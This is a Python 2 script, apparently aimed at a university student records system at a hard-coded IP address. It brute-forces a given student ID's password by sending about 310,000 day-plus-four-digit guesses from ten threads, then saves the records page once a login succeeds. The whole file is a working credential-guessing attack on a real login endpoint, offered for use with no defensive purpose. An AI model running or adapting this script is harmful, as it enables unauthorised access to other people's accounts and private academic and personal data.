
import urllib  
import urllib2
import cookielib
import re
import threading
import os
import datetime
find=0
class SDU_Spider:  
    # 申明相关的属性  
    def __init__(self,a):    
        self.loginUrl = 'http://202.115.47.141/loginAction.do'   # 登录的url
        self.resultUrl = 'http://202.115.47.141/xjInfoAction.do?oper=xjxx' 
        self.cookieJar = cookielib.CookieJar()                                      # 初始化一个CookieJar来处理Cookie的信息
        self.postdata=urllib.urlencode(a)     # POST的数据
       
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookieJar))
    def sdu_init(self):
        # 初始化链接并且获取cookie
        myRequest = urllib2.Request(url = self.loginUrl,data = self.postdata)   # 自定义一个请求
        result = self.opener.open(myRequest)            # 访问登录页面，获取到必须的cookie的值
        result = self.opener.open(self.resultUrl)       # 访问成绩页面，获得成绩的数据
        # 打印返回的内容
        con=result.read()
        if len(con)>3000:
            
            f=file('F:/python2/content/'+str(self.postdata)+'.html','w')
            f.write(con)
            f.close()
            global find
            find=1 
    
xuehao=input('xuehao:\n')
def t(a,b):
    
    for i in range(1,32):
        i=str(i).zfill(2)
        for ii in range(a,b):
            ii=str(ii).zfill(4)
            dic={'zjh':str(xuehao),'mm':i+ii}
            mySpider=SDU_Spider(dic)
            try:
                mySpider.sdu_init()
            except:
                continue
                
            
            #print i+ii+'\n'
   
    
t1=threading.Thread (target=t,args=(0,1000))
t2=threading.Thread (target=t,args=(1000,2000))
t3=threading.Thread (target=t,args=(2000,3000))
t4=threading.Thread (target=t,args=(3000,4000))
t5=threading.Thread (target=t,args=(4000,5000))
t6=threading.Thread (target=t,args=(5000,6000))
t7=threading.Thread (target=t,args=(6000,7000))
t8=threading.Thread (target=t,args=(7000,8000))
t9=threading.Thread (target=t,args=(8000,9000))
t10=threading.Thread (target=t,args=(9000,10000))
threads=[t1,t2,t3,t4,t5,t6,t7,t8,t9,t10]
starttime = datetime.datetime.now()
for th in threads:
    
    th.setDaemon(True)
    th.start()
while True :
    if find==1:
        
        endtime = datetime.datetime.now()
        print (endtime - starttime)
        os._exit (0)
      



